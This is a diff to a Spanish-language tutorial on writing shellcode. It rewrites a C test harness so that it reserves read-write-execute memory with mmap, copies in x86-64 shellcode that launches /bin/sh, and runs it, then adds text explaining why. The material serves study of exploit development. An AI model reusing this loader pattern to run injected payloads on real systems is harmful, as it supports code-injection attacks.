@@ -62,7 +62,7 @@ Este comando genera una cadena de bytes que se puede inyectar en un programa.
 
 ### 6. Uso del Shellcode en C
 
-Podemos probar el shellcode en un programa en C:
+Podemos probar el shellcode en un programa en C, tambien llamado un loader:
 
 ```c
 #include <stdio.h>
@@ -70,28 +70,40 @@ Podemos probar el shellcode en un programa en C:
 #include <sys/mman.h>
 #include <unistd.h>
 
-unsigned char shellcode[] = "\x48\x31\xc0\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05";
+unsigned char shellcode[] = 
+    "\x48\x31\xc0\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57"
+    "\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05";
 
 int main() {
     printf("Ejecutando shellcode...\n");
 
-    // Obtener el tamaño de la página de memoria
-    size_t pagesize = sysconf(_SC_PAGESIZE);
-    void *shellcode_page = (void *)((size_t)shellcode & ~(pagesize - 1));
+    // Obtener el tamaño del shellcode
+    size_t shellcode_size = sizeof(shellcode);
 
-    // Cambiar permisos de memoria a ejecutable
-    if (mprotect(shellcode_page, pagesize, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
-        perror("mprotect");
+    // Reservar memoria RWX con mmap
+    void *exec_mem = mmap(NULL, shellcode_size, 
+                          PROT_READ | PROT_WRITE | PROT_EXEC, 
+                          MAP_ANON | MAP_PRIVATE, -1, 0);
+    
+    if (exec_mem == MAP_FAILED) {
+        perror("mmap");
         return 1;
     }
 
-    // Ejecutar shellcode
-    void (*ret)() = (void(*)())shellcode;
-    ret();
+    // Copiar el shellcode a la memoria ejecutable
+    memcpy(exec_mem, shellcode, shellcode_size);
+
+    // Ejecutar el shellcode
+    ((void(*)())exec_mem)();
 
     return 0;
 }
 ```
+
+Se copia a un segmento de memoria asignado dinámicamente con mmap() porque las secciones donde normalmente se almacenan los datos en un programa suelen tener permisos de solo lectura o sin permisos de ejecución, lo que impediría la ejecución del código.
+
+Además, mmap() permite reservar una región de memoria con permisos específicos, como lectura, escritura y ejecución (PROT_READ | PROT_WRITE | PROT_EXEC), asegurando que el código almacenado en ella pueda modificarse y ejecutarse sin restricciones impuestas por el sistema operativo.
+
 
 Compilamos y ejecutamos:
 
